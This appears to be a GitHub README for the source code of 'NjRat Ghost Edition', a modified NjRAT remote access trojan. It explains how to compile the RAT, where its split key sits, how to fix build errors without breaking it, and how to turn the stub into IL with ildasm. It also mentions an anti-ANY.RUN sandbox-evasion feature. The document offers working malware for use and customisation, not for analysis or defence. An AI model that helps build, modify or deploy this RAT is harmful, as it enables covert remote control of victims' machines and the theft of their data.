# Source code of NjRat Ghost Edition

## Current issues: Anti ANY.RUN does not function in the stub for some reason.
## But in a normal form application it works fine.
  
Before editing or opening code/forms in the source, compile in release/debug mode.  
You will run into errors if you do not do that first.  
  
The split key is here in the NjRAT source:  
https://github.com/De-eloper/SRC-NjRat-Ghost-Edition/blob/main/SRC%20-%20NjRAT%20Ghost%20Edition/Modules/Class7.vb#L51  
However, if you just change it. Plugins will stop working, a video showing how to mod the plugins are here:  
  


https://user-images.githubusercontent.com/113988354/203529086-be6ddffc-32fe-40ed-be7d-79155bd9d9fa.mp4


  
If you edit Form1 or maybe some other forms and try to compile you may run into errors like:  
Type 'NJRAT.L1' is not defined  
Type 'NJRAT.Pp1' is not defined  
Type 'NJRAT.Gclass9' is not defined  
  
These will happen during compiling, to fix them, follow this:

Change
```
Me.L1 = New NJRAT.L1()
  
Me.Pp1 = New NJRAT.Pp1()
```
To
```
Me.L1 = New L1()
  
Me.Pp1 = New Pp1()
```

Remove the "NJRAT." and the errors will go away and not break the RAT.
If you do it wrong the notification form will never show up.
  
When you build it the solutions, move the binaries to NjRat Ghost Edition - BIN  
then your mod will function, it cannot work in a single exe mode.  
  
If you run into any errors, please open an issue.  
I can try to fix or show you how to add new features.  
  
# Stub to .IL file
  
you need visual studio developer command prompt. check/search for:  
  
VsDevCmd.bat or Developer Command Prompt

If not found search Google or where to find the dev prompt cmd.  
To convert the exe, you need to do 1 cmd.  
  
Example command:  
  
ildasm.exe "C:\Stub.exe" /out="C:\Stub.il"  
  
Like that:  
ildasm.exe "(path your .exe)" /out="(path your Stub.il)"  
  
Need more or video? Open an issue.  
  
  ![i](https://user-images.githubusercontent.com/113988354/203574506-0211fc4a-1a65-45fd-951d-f2171acbe992.PNG)

  
